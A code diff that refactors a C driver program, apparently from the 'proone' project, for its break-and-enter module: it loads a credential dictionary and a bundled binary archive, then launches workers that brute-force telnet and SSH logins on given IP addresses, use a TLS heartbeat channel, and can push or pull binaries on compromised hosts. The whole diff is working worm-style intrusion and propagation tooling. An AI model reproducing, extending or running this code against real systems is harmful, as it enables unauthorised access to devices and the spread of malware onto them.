@@ -3,10 +3,12 @@
 #include <assert.h>
 #include <string.h>
 #include <errno.h>
+#include <getopt.h>
 
 #include <signal.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sys/stat.h>
 #include <arpa/inet.h>
 
 #include <mbedtls/entropy.h>
@@ -17,63 +19,266 @@
 #include "mbedtls.h"
 #include "proone_conf/x509.h"
 
+#define HELP_STR \
+"Usage: %s <options> <target> [more targets ...]\n"\
+"Options:\n"\
+"  --cdict <PATH>  path to credential dictionary(required)\n"\
+"  --nybin <PATH>  path to nybin(required)\n"\
+"  --vercmp <INT>  vercmp() callback return value. Use negative to get binary\n"\
+"                  from target. Use positive value to update binary of target.\n"\
+"                  Use zero to disable M2M binary update(default).\n"\
+"Target: IPv4 or IPv6 address\n"
 
-static char m_upbin_path[256];
-static char m_upbin_args[1024];
-static size_t m_upbin_args_size;
+struct {
+	char *cd_path;
+	char *nybin_path;
+	struct {
+		prne_ip_addr_t *arr;
+		size_t cnt;
+	} targets;
+	int vercmp_ret;
+} prog_conf;
+
+struct {
+	struct {
+		uint8_t *m;
+		size_t l;
+		prne_cred_dict_t ctx;
+	} cred_dict;
+	struct {
+		uint8_t *m;
+		size_t l;
+	} nybin;
+	struct {
+		const uint8_t *m;
+		size_t l;
+		prne_bin_archive_t ctx;
+	} ba;
+	struct {
+		char path[256];
+		char args[1024];
+		size_t args_size;
+	} upbin;
+	struct {
+		mbedtls_entropy_context entropy;
+		mbedtls_ctr_drbg_context ctr_drbg;
+		mbedtls_x509_crt ca;
+		mbedtls_x509_crt crt;
+		mbedtls_pk_context key;
+		mbedtls_ssl_config conf;
+	} ssl;
+	prne_llist_t wkr_list;
+	prne_rcb_param_t rcb_param;
+	prne_bne_param_t bne_param;
+} prog_g;
 
 static void print_help (FILE *o, const char *prog) {
-	fprintf(
-		o,
-		"Usage: %s <cred dict> <nybin> <target 0> ... [target N]\n"
-		"Options:\n"
-		"\t<cred dict>: path to credential dictionary\n"
-		"\t<nybin>: path to nybin\n"
-		"\ttarget N: IPv4 or IPv6 address\n",
-		prog);
+	fprintf(o, HELP_STR, prog);
 }
 
-static bool load_file (const int fd, uint8_t **m, size_t *len) {
-	bool ret = true;
-	uint8_t *buf;
-	size_t buf_size;
-	ssize_t f_ret;
-	void *ny;
+static void init_g (void) {
+	prne_memzero(&prog_g, sizeof(prog_g));
 
-	buf_size = prne_getpagesize();
-	buf = prne_malloc(1, buf_size);
-	if (buf == 0) {
-		perror("prne_malloc()");
-		return false;
+	prne_init_cred_dict(&prog_g.cred_dict.ctx);
+	prne_init_bne_param(&prog_g.bne_param);
+	prne_init_rcb_param(&prog_g.rcb_param);
+	prne_init_bin_archive(&prog_g.ba.ctx);
+
+	mbedtls_x509_crt_init(&prog_g.ssl.ca);
+	mbedtls_x509_crt_init(&prog_g.ssl.crt);
+	mbedtls_pk_init(&prog_g.ssl.key);
+	mbedtls_ssl_config_init(&prog_g.ssl.conf);
+
+	mbedtls_entropy_init(&prog_g.ssl.entropy);
+	mbedtls_ctr_drbg_init(&prog_g.ssl.ctr_drbg);
+	prne_init_llist(&prog_g.wkr_list);
+
+	prne_assert(mbedtls_ctr_drbg_seed(
+		&prog_g.ssl.ctr_drbg,
+		mbedtls_entropy_func,
+		&prog_g.ssl.entropy,
+		NULL,
+		0) == 0);
+}
+
+static void free_g (void) {
+	prne_free_llist(&prog_g.wkr_list);
+	mbedtls_ctr_drbg_free(&prog_g.ssl.ctr_drbg);
+	mbedtls_entropy_free(&prog_g.ssl.entropy);
+	mbedtls_x509_crt_free(&prog_g.ssl.ca);
+	mbedtls_x509_crt_free(&prog_g.ssl.crt);
+	mbedtls_pk_free(&prog_g.ssl.key);
+	mbedtls_ssl_config_free(&prog_g.ssl.conf);
+	prne_free_cred_dict(&prog_g.cred_dict.ctx);
+	prne_free_bne_param(&prog_g.bne_param);
+	prne_free_rcb_param(&prog_g.rcb_param);
+	prne_free_bin_archive(&prog_g.ba.ctx);
+	prne_free(prog_g.cred_dict.m);
+	prog_g.cred_dict.m = NULL;
+	prog_g.cred_dict.l = 0;
+	prne_free(prog_g.nybin.m);
+	prog_g.nybin.m = NULL;
+	prog_g.nybin.l = 0;
+}
+
+static void init_conf (void) {
+	prne_memzero(&prog_conf, sizeof(prog_conf));
+}
+
+static void free_conf (void) {
+	prne_free(prog_conf.cd_path);
+	prog_conf.cd_path = NULL;
+	prne_free(prog_conf.nybin_path);
+	prog_conf.nybin_path = NULL;
+	prne_free(prog_conf.targets.arr);
+	prog_conf.targets.arr = NULL;
+	prog_conf.targets.cnt = 0;
+}
+
+static void load_str (char **dst, const char *str) {
+	*dst = prne_redup_str(*dst, str);
+	if (*dst == NULL) {
+		perror("prne_redup_str()");
+		abort();
 	}
+}
+
+static int parse_args (const int argc, char *const*args) {
+	static const struct option lopts[] = {
+		{ "cdict", required_argument, 0, 0 },
+		{ "nybin", required_argument, 0, 0 },
+		{ "vercmp", required_argument, 0, 0 },
+		{ 0, 0, 0, 0 }
+	};
+	bool arg_proc = false;
+	int f_ret, li;
 
 	while (true) {
-		f_ret = read(fd, buf, buf_size);
+		f_ret = getopt_long(argc, args, "", lopts, &li);
 		if (f_ret == 0) {
-			break;
-		}
-		if (f_ret < 0) {
-			perror("read()");
-			ret = false;
-			break;
-		}
+			const struct option *lo = lopts + li;
 
-		ny = prne_realloc(*m, 1, *len + f_ret);
-		if (ny == NULL) {
-			perror("prne_realloc()");
-			ret = false;
+			if (strcmp(lo->name, "cdict") == 0) {
+				load_str(&prog_conf.cd_path, optarg);
+			}
+			else if (strcmp(lo->name, "nybin") == 0) {
+				load_str(&prog_conf.nybin_path, optarg);
+			}
+			else if (strcmp(lo->name, "vercmp") == 0) {
+				f_ret = sscanf(optarg, "%d", &prog_conf.vercmp_ret);
+				if (f_ret == EOF) {
+					perror("sscanf()");
+					return 1;
+				}
+				if (f_ret != 1) {
+					fprintf(
+						stderr,
+						"%s: invalid argument for --vercmp\n",
+						optarg);
+					return 2;
+				}
+			}
+			else {
+				abort();
+			}
+
+			arg_proc = true;
+		}
+		else if (f_ret == '?') {
+			return 2;
+		}
+		else {
 			break;
 		}
-		*m = (uint8_t*)ny;
-		memcpy(*m + *len, buf, f_ret);
-		*len += f_ret;
 	}
 
-	prne_free(buf);
+	if (!arg_proc) {
+		print_help(stderr, args[0]);
+		return 2;
+	}
+	if (prog_conf.cd_path == NULL) {
+		fprintf(stderr, "--cred_dict required.\n");
+		return 2;
+	}
+	if (prog_conf.nybin_path == NULL) {
+		fprintf(stderr, "--nybin required.\n");
+		return 2;
+	}
+	prog_conf.targets.cnt = argc - optind;
+	if (prog_conf.targets.cnt == 0) {
+		fprintf(stderr, "No target.\n");
+		return 2;
+	}
+
+	prog_conf.targets.arr = prne_calloc(
+		sizeof(prne_ip_addr_t),
+		prog_conf.targets.cnt);
+	for (size_t i = 0; i < prog_conf.targets.cnt; i += 1, optind += 1) {
+		prne_ip_addr_t *p = prog_conf.targets.arr + i;
+
+		if (inet_pton(AF_INET6, args[optind], p->addr)) {
+			p->ver = PRNE_IPV_6;
+		}
+		else if (inet_pton(AF_INET, args[optind], p->addr)) {
+			p->ver = PRNE_IPV_4;
+		}
+		else {
+			fprintf(stderr, "%s: invalid IP address\n", args[optind]);
+			return 2;
+		}
+	}
+
+	return 0;
+}
+
+static bool load_file (const char *path, uint8_t **obuf, size_t *olen) {
+	bool ret = false;
+	int fd = -1;
+	ssize_t f_ret;
+	uint8_t *m = NULL;
+	struct stat st;
+
+	fd = open(path, O_RDONLY);
+	if (fd < 0) {
+		perror(path);
+		goto END;
+	}
+
+	f_ret = fstat(fd, &st);
+	if (f_ret != 0) {
+		perror(path);
+		goto END;
+	}
+
+	m = (uint8_t*)prne_malloc(1, st.st_size);
+	if (m == NULL && st.st_size > 0) {
+		perror("prne_malloc()");
+		goto END;
+	}
+	f_ret = read(fd, m, st.st_size);
+	if (f_ret < 0) {
+		perror("read()");
+		goto END;
+	}
+	if (f_ret != st.st_size) {
+		fprintf(stderr, "%s: file changed whilst loading!\n", path);
+		goto END;
+	}
+	ret = true;
+
+END:
+	prne_close(fd);
+	if (ret) {
+		*obuf = m;
+		*olen = st.st_size;
+	}
+	else {
+		prne_free(m);
+	}
 	return ret;
 }
 
-static void load_htbt_ssl_conf (
+static bool load_htbt_ssl_conf (
 	mbedtls_x509_crt *ca,
 	mbedtls_x509_crt *crt,
 	mbedtls_pk_context *key,
@@ -102,6 +307,8 @@ static void load_htbt_ssl_conf (
 	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
 	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
 	mbedtls_ssl_conf_authmode(conf, MBEDTLS_SSL_VERIFY_REQUIRED);
+
+	return true;
 }
 
 static void report_result (const prne_bne_result_t *r) {
@@ -172,7 +379,7 @@ static uint64_t cb_uptime (void *ctx) {
 }
 
 static int cb_vercmp (void *ctx, const uint8_t *uuid) {
-	return -1;
+	return prog_conf.vercmp_ret;
 }
 
 static int cb_tmpfile (
@@ -232,165 +439,100 @@ static bool cb_upbin (void *ctx, const char *path, const prne_htbt_cmd_t *cmd) {
 	const size_t path_len = prne_nstrlen(path);
 
 	prne_dbgast(path_len > 0);
-	if (path_len + 1 > sizeof(m_upbin_path) ||
-		cmd->mem_len > sizeof(m_upbin_args))
+	if (path_len + 1 > sizeof(prog_g.upbin.path) ||
+		cmd->mem_len > sizeof(prog_g.upbin.args))
 	{
 		errno = ENOMEM;
 		return false;
 	}
 
-	memcpy(m_upbin_path, path, path_len + 1);
-	memcpy(m_upbin_args, cmd->mem, cmd->mem_len);
-	m_upbin_args_size = cmd->mem_len;
+	memcpy(prog_g.upbin.path, path, path_len + 1);
+	memcpy(prog_g.upbin.args, cmd->mem, cmd->mem_len);
+	prog_g.upbin.args_size = cmd->mem_len;
 
 	return true;
 }
 
 static void do_run_upbin (void) {
-	for (size_t i = 0; i < m_upbin_args_size; i += 1) {
-		if (m_upbin_args[i] == 0) {
-			m_upbin_args[i] = ' ';
+	for (size_t i = 0; i < prog_g.upbin.args_size; i += 1) {
+		if (prog_g.upbin.args[i] == 0) {
+			prog_g.upbin.args[i] = ' ';
 		}
 	}
-	m_upbin_args[m_upbin_args_size - 1] = 0;
+	prog_g.upbin.args[prog_g.upbin.args_size - 1] = 0;
 
 	printf(
 		"upbin received:\n%s %s\n",
-		m_upbin_path,
-		m_upbin_args);
+		prog_g.upbin.path,
+		prog_g.upbin.args);
 }
 
 
-int main (const int argc, const char **args) {
+int main (int argc, char **args) {
 	static prne_bne_vector_t ARR_VEC[] = {
 		PRNE_BNE_V_HTBT,
 		PRNE_BNE_V_BRUTE_TELNET,
 		PRNE_BNE_V_BRUTE_SSH
 	};
 	int ret = 0;
-	int fd = -1;
-	uint8_t *m_cred_dict = NULL, *m_nybin = NULL;
-	size_t cred_dict_len = 0, nybin_len = 0;
-	const uint8_t *m_dv, *m_ba;
-	size_t dv_len, ba_len;
-	prne_ip_addr_t *arr = NULL;
-	size_t cnt = 0;
-	prne_cred_dict_t dict;
-	prne_bin_archive_t ba;
-	prne_bne_param_t param;
-	prne_rcb_param_t rcb;
 	prne_pack_rc_t prc;
-	mbedtls_entropy_context entropy;
-	mbedtls_ctr_drbg_context ctr_drbg;
-	struct {
-		mbedtls_x509_crt ca;
-		mbedtls_x509_crt crt;
-		mbedtls_pk_context key;
-		mbedtls_ssl_config conf;
-	} htbt_ssl;
 	pth_event_t ev_root = NULL;
-	prne_llist_t wkr_list;
 
 	signal(SIGPIPE, SIG_IGN);
 
-	prne_init_cred_dict(&dict);
-	prne_init_bne_param(&param);
-	prne_init_rcb_param(&rcb);
-	prne_init_bin_archive(&ba);
-
-	mbedtls_x509_crt_init(&htbt_ssl.ca);
-	mbedtls_x509_crt_init(&htbt_ssl.crt);
-	mbedtls_pk_init(&htbt_ssl.key);
-	mbedtls_ssl_config_init(&htbt_ssl.conf);
-
-	mbedtls_entropy_init(&entropy);
-	mbedtls_ctr_drbg_init(&ctr_drbg);
-	prne_init_llist(&wkr_list);
-
+	init_conf();
+	init_g();
 	prne_assert(pth_init());
 
-	prne_assert(mbedtls_ctr_drbg_seed(
-		&ctr_drbg,
-		mbedtls_entropy_func,
-		&entropy,
-		NULL,
-		0) == 0);
-
 // TRY
-	if (argc < 4) {
-		print_help(stderr, args[0]);
-		ret = 2;
+	ret = parse_args(argc, args);
+	if (ret != 0) {
 		goto END;
 	}
 
-	load_htbt_ssl_conf(
-		&htbt_ssl.ca,
-		&htbt_ssl.crt,
-		&htbt_ssl.key,
-		&htbt_ssl.conf,
-		&ctr_drbg);
-
-	cnt = (size_t)argc - 3;
-	arr = (prne_ip_addr_t*)prne_calloc(sizeof(prne_ip_addr_t), cnt);
-	if (arr == NULL) {
-		ret = 2;
-		perror("prne_calloc()");
-		goto END;
-	}
-	for (size_t i = 0; i < cnt; i += 1) {
-		const char *str = args[i + 3];
-		prne_ip_addr_t *e = arr + i;
-
-		if (inet_pton(AF_INET6, str, e->addr)) {
-			e->ver = PRNE_IPV_6;
-		}
-		else if (inet_pton(AF_INET, str, e->addr)) {
-			e->ver = PRNE_IPV_4;
-		}
-		else {
-			ret = 2;
-			fprintf(stderr, "%s: invalid IP address\n", str);
-			goto END;
-		}
-	}
-
-	fd = open(args[1], O_RDONLY);
-	if (fd < 0) {
-		perror(args[1]);
+	if (!load_htbt_ssl_conf(
+			&prog_g.ssl.ca,
+			&prog_g.ssl.crt,
+			&prog_g.ssl.key,
+			&prog_g.ssl.conf,
+			&prog_g.ssl.ctr_drbg) ||
+		!load_file(
+			prog_conf.cd_path,
+			&prog_g.cred_dict.m,
+			&prog_g.cred_dict.l) ||
+		!load_file(
+			prog_conf.nybin_path,
+			&prog_g.nybin.m,
+			&prog_g.nybin.l))
+	{
 		ret = 1;
 		goto END;
 	}
-	if (!load_file(fd, &m_cred_dict, &cred_dict_len)) {
-		ret = 1;
-		goto END;
-	}
-	prne_close(fd);
 
-	fd = open(args[2], O_RDONLY);
-	if (fd < 0) {
-		perror(args[2]);
-		ret = 1;
-		goto END;
-	}
-	if (!load_file(fd, &m_nybin, &nybin_len)) {
-		ret = 1;
-		goto END;
-	}
-	prne_close(fd);
-
-	if (!prne_dser_cred_dict(&dict, m_cred_dict, cred_dict_len)) {
+	if (!prne_dser_cred_dict(
+			&prog_g.cred_dict.ctx,
+			prog_g.cred_dict.m,
+			prog_g.cred_dict.l))
+	{
 		perror("prne_dser_cred_dict()");
 		ret = 1;
 		goto END;
 	}
 
-	if (!prne_index_nybin(m_nybin, nybin_len, &m_dv, &dv_len, &m_ba, &ba_len)) {
-		fprintf(stderr, "prne_index_nybin() failed.\n");
+	if (!prne_index_nybin(
+			prog_g.nybin.m,
+			prog_g.nybin.l,
+			&prog_g.rcb_param.m_dv,
+			&prog_g.rcb_param.dv_len,
+			&prog_g.ba.m,
+			&prog_g.ba.l))
+	{
+		perror("prne_index_nybin()");
 		ret = 1;
 		goto END;
 	}
 
-	prc = prne_index_bin_archive(m_ba, ba_len, &ba);
+	prc = prne_index_bin_archive(prog_g.ba.m, prog_g.ba.l, &prog_g.ba.ctx);
 	if (prc != PRNE_PACK_RC_OK) {
 		fprintf(
 			stderr,
@@ -400,31 +542,29 @@ int main (const int argc, const char **args) {
 		goto END;
 	}
 
-	rcb.m_dv = m_dv;
-	rcb.dv_len = dv_len;
-	rcb.ba = &ba;
+	prog_g.rcb_param.ba = &prog_g.ba.ctx;
 
-	param.htbt_ssl_conf = &htbt_ssl.conf;
-	param.cred_dict = &dict;
-	param.vector.arr = ARR_VEC;
-	param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
-	param.rcb = &rcb;
-	param.cb.exec_name = cb_exec_name;
-	param.cb.uptime = cb_uptime;
-	param.cb.vercmp = cb_vercmp;
-	param.cb.tmpfile = cb_tmpfile;
-	param.cb.upbin = cb_upbin;
+	prog_g.bne_param.htbt_ssl_conf = &prog_g.ssl.conf;
+	prog_g.bne_param.cred_dict = &prog_g.cred_dict.ctx;
+	prog_g.bne_param.vector.arr = ARR_VEC;
+	prog_g.bne_param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
+	prog_g.bne_param.rcb = &prog_g.rcb_param;
+	prog_g.bne_param.cb.exec_name = cb_exec_name;
+	prog_g.bne_param.cb.uptime = cb_uptime;
+	prog_g.bne_param.cb.vercmp = cb_vercmp;
+	prog_g.bne_param.cb.tmpfile = cb_tmpfile;
+	prog_g.bne_param.cb.upbin = cb_upbin;
 
-	for (size_t i = 0; i < cnt; i += 1) {
+	for (size_t i = 0; i < prog_conf.targets.cnt; i += 1) {
 		prne_worker_t *w = prne_malloc(sizeof(prne_worker_t), 1);
 
 		prne_init_worker(w);
-		prne_assert(
-			w != NULL &&
-			prne_llist_append(&wkr_list, (prne_llist_element_t)w) != NULL);
+		prne_assert(prne_llist_append(
+			&prog_g.wkr_list,
+			(prne_llist_element_t)w) != NULL);
 
-		param.subject = arr[i];
-		if (!prne_alloc_bne(w, &ctr_drbg, &param)) {
+		prog_g.bne_param.subject = prog_conf.targets.arr[i];
+		if (!prne_alloc_bne(w, &prog_g.ssl.ctr_drbg, &prog_g.bne_param)) {
 			perror("prne_alloc_bne()");
 			abort();
 		}
@@ -433,11 +573,14 @@ int main (const int argc, const char **args) {
 		prne_assert(w->pth != NULL);
 	}
 
-	while (wkr_list.size > 0) {
+	while (prog_g.wkr_list.size > 0) {
 		// rebuild event
 		pth_event_free(ev_root, TRUE);
 		ev_root = NULL;
-		for (prne_llist_entry_t *e = wkr_list.head; e != NULL; e = e->next) {
+		for (prne_llist_entry_t *e = prog_g.wkr_list.head;
+			e != NULL;
+			e = e->next)
+		{
 			prne_worker_t *w = (prne_worker_t*)e->element;
 			pth_event_t ev = pth_event(
 				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
@@ -455,7 +598,7 @@ int main (const int argc, const char **args) {
 		pth_wait(ev_root);
 
 		// reap
-		for (prne_llist_entry_t *e = wkr_list.head; e != NULL;) {
+		for (prne_llist_entry_t *e = prog_g.wkr_list.head; e != NULL;) {
 			prne_worker_t *w = (prne_worker_t*)e->element;
 			pth_attr_t attr = pth_attr_of(w->pth);
 			pth_state_t state;
@@ -473,7 +616,7 @@ int main (const int argc, const char **args) {
 
 				prne_free_worker(w);
 				prne_free(w);
-				e = prne_llist_erase(&wkr_list, e);
+				e = prne_llist_erase(&prog_g.wkr_list, e);
 			}
 			else {
 				e = e->next;
@@ -482,26 +625,12 @@ int main (const int argc, const char **args) {
 	}
 
 END: // CATCH
-	prne_free_llist(&wkr_list);
 	pth_event_free(ev_root, TRUE);
-	mbedtls_ctr_drbg_free(&ctr_drbg);
-	mbedtls_entropy_free(&entropy);
-	mbedtls_x509_crt_free(&htbt_ssl.ca);
-	mbedtls_x509_crt_free(&htbt_ssl.crt);
-	mbedtls_pk_free(&htbt_ssl.key);
-	mbedtls_ssl_config_free(&htbt_ssl.conf);
-	prne_free_cred_dict(&dict);
-	prne_free_bne_param(&param);
-	prne_free_rcb_param(&rcb);
-	prne_free_bin_archive(&ba);
-	prne_close(fd);
-	prne_free(arr);
-	prne_free(m_cred_dict);
-	prne_free(m_nybin);
-
+	free_g();
+	free_conf();
 	pth_kill();
 
-	if (prne_nstrlen(m_upbin_path) > 0) {
+	if (prog_g.upbin.path[0] != 0) {
 		do_run_upbin();
 	}
 
